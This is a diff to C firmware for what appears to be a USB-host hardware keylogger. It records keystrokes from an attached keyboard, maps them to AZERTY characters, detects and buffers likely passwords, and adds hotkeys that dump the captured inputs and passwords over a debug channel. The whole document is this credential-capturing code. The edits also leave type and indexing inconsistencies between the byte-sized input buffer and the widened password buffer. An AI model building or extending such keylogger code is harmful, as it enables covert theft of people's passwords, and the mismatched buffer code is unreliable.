@@ -17,12 +17,12 @@
 /*
  * defines
  */
+#define NB_INPUT 200
 #define PASSWORD_MAX_SIZE 30  // must be < NB_INPUT
 
 /*
  * variables
  */
-
 static uint8_t inputs[NB_INPUT];
 static int     input_timer = -1;
 int            input_index = 0;
@@ -30,13 +30,13 @@ int            input_index = 0;
 static int nb_char_pressed = 0;
 uint8_t    led_status      = 7;
 
-uint8_t passwords[PASSWORD_BUFFER_SIZE];
-int     password_index = 0;
+uint16_t passwords[PASSWORD_BUFFER_SIZE];
+int      password_index = 0;
 
 /*
  * prototypes
  */
-static void usbh_detector(uint16_t input);
+static void usbh_detector(char input);
 
 /*
  * thread HID
@@ -61,16 +61,19 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
         uint16_t input = get_input_hid(report);
         rtt_printf("Key code: %04x, input_index = %d", input, input_index);
         if((uint8_t)input) {
-            rtt_printf("INPUT");
             inputs[input_index] = input;
-            usbh_detector(input);
+            usbh_detector(hid2azerty(input));
             if(input_index++ >= 200)
                 input_index = 0;
         }
 
-        if(report[2] == KEY_F2)
+        if(report[2] == KEY_F6)
+            for(int i = 0; i < input_index; i++)
+                rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);
+
+        if(report[2] == KEY_F5)
             for(int i = 0; i < password_index; i++)
-                rtt_printf("%02x", password_hid[i]);
+                rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
 
         if(report[2] == KEY_F1 &&
            report[3] == KEY_F2 &&
@@ -122,18 +125,19 @@ static void ThreadTestHID(void *p)
  */
 void usbh_init(void)
 {
-    //  password[0] = 'P';
-    //  password[1] = 'a';
-    //  password[2] = 's';
-    //  password[3] = 's';
-    //  password[4] = 'W';
-    //  password[5] = 'o';
-    //  password[6] = 'r';
-    //  password[7] = 'd';
-    //  password[8] = ' ';
-    //  password[9] ='!';
+    //  passwords[0] = 'P';
+    //  passwords[1] = 'a';
+    //  passwords[2] = 's';
+    //  passwords[3] = 's';
+    //  passwords[4] = 'W';
+    //  passwords[5] = 'o';
+    //  passwords[6] = 'r';
+    //  passwords[7] = 'd';
+    //  passwords[8] = ' ';
+    //  passwords[9] = '!';
 
     //  password_index = 10;
+
     /*USBH_FS OTG*/
     palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
     palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
@@ -155,14 +159,14 @@ static void store_lasts_inputs(int size)
 {
     if(input_index < size) {  // buffer made a loop
         int bytes_written = size - input_index;
-        memcpy(password + password_index, inputs + NB_INPUT - bytes_written, bytes_written);
-        memcpy(password + password_index + bytes_written, inputs, size - bytes_written);
+        memcpy(passwords + password_index, inputs + NB_INPUT - bytes_written, bytes_written);
+        memcpy(passwords + password_index + bytes_written, inputs, size - bytes_written);
     } else
-        memcpy(password + password_index, inputs + input_index - size, size);
+        memcpy(passwords + password_index, inputs + input_index - size, size);
     password_index += size;
 }
 
-void usbh_detector(uint16_t input)
+void usbh_detector(char input)
 {
     if(password_index + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
         rtt_printf("[WARNING] Password buffer full\n");
@@ -189,7 +193,7 @@ void usbh_detector(uint16_t input)
             input_timer = -1;
             // print password buffer
             rtt_printf("PASSWORD :");
-            SEGGER_RTT_Write(0, password, password_index);
+            SEGGER_RTT_Write(0, passwords, password_index);
             rtt_printf("");
             break;
     }
@@ -200,7 +204,7 @@ void usbh_detector(uint16_t input)
     if(input_timer == 0) {
         store_lasts_inputs(PASSWORD_MAX_SIZE);
         rtt_printf("PASSWORD :");
-        SEGGER_RTT_Write(0, password, password_index);
+        SEGGER_RTT_Write(0, passwords, password_index);
         rtt_printf("");
     }
 }
